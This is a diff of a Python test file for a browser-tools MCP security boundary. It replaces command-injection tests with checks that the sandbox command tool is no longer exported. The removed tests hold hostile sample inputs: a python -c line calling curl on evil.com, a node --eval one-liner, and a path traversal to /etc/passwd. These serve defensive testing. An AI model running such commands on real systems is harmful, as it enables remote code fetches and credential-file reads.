@@ -1,75 +1,24 @@
-"""Tests for browser tools MCP security hardening (section-02).
+"""Tests for the active browser MCP security boundary.
 
-Covers F22 (command injection), F23 (domain SSRF blocklist), F24 (localhost fallback).
+Covers the retired command-execution surface, domain SSRF blocklist, and
+gateway configuration behavior.
 """
 
-from unittest.mock import AsyncMock, MagicMock, patch
+from unittest.mock import patch
 
 import pytest
 
 pytestmark = [pytest.mark.unit]
 
 
-class TestCommandInjection:
-    """F22: Full command validation, not just first word."""
+class TestRetiredCommandSurface:
+    """OpenSandbox-backed command execution must stay unavailable."""
 
-    @pytest.mark.asyncio
-    async def test_blocks_eval_flag(self):
-        """Commands with -e or --eval flags are blocked."""
-        from app.mcp.browser_tools_mcp import handle_sandbox_exec_command, ToolError
+    def test_command_execution_is_not_exported_as_an_mcp_tool(self):
+        from app.mcp import browser_tools_mcp
 
-        with pytest.raises(ToolError) as exc_info:
-            await handle_sandbox_exec_command(
-                'python -c "import os; os.system(\'curl evil.com\')"',
-                user_id=1, tenant_id="t1",
-            )
-        assert "not allowed" in exc_info.value.message.lower()
-
-    @pytest.mark.asyncio
-    async def test_blocks_node_eval(self):
-        """Node with --eval is blocked despite 'node' being in allowlist."""
-        from app.mcp.browser_tools_mcp import handle_sandbox_exec_command, ToolError
-
-        with pytest.raises(ToolError) as exc_info:
-            await handle_sandbox_exec_command(
-                "node -e 'process.exit(1)'",
-                user_id=1, tenant_id="t1",
-            )
-        assert "not allowed" in exc_info.value.message.lower()
-
-    @pytest.mark.asyncio
-    async def test_blocks_path_traversal_in_args(self):
-        """Path traversal in command arguments is blocked."""
-        from app.mcp.browser_tools_mcp import handle_sandbox_exec_command, ToolError
-
-        with pytest.raises(ToolError) as exc_info:
-            await handle_sandbox_exec_command(
-                "python ../../etc/passwd",
-                user_id=1, tenant_id="t1",
-            )
-        assert "not allowed" in exc_info.value.message.lower() or "traversal" in exc_info.value.message.lower()
-
-    @pytest.mark.asyncio
-    async def test_allows_simple_command(self):
-        """Simple allowed command without dangerous flags passes validation."""
-        from app.mcp.browser_tools_mcp import handle_sandbox_exec_command
-
-        mock_dispatcher = MagicMock()
-        mock_dispatcher.dispatch = AsyncMock(return_value="job-123")
-
-        mock_db = MagicMock()
-        mock_db.__aenter__ = AsyncMock(return_value=MagicMock())
-        mock_db.__aexit__ = AsyncMock(return_value=False)
-
-        with (
-            patch("app.core.database.get_db_context", return_value=mock_db),
-            patch("app.services.sandbox_dispatcher.SandboxDispatcher", return_value=mock_dispatcher),
-        ):
-            result = await handle_sandbox_exec_command(
-                "python script.py",
-                user_id=1, tenant_id="t1",
-            )
-        assert result["status"] == "dispatched"
+        assert set(browser_tools_mcp.TOOL_HANDLERS) == {"browser.execute_actions"}
+        assert not hasattr(browser_tools_mcp, "handle_sandbox_exec_command")
 
 
 class TestDomainValidation:
